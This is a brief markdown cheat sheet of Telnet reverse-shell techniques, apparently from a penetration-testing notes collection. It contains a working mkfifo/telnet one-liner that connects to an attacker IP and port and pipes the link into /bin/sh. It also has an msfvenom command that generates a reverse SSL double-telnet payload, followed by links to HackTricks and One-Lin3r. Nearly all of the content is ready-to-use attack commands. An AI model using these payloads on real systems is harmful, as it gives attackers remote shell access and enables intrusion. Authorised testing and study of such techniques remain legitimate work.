# Telnet

## 01 - One-liners

```
$ TF=$(mktemp -u)
mkfifo $TF && telnet <attacker_IP> <attacker_PORT> 0<$TF | /bin/sh 1>$TF; rm -f $TF
```

## 02 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_ssl_double_telnet handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

---
## References

- [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)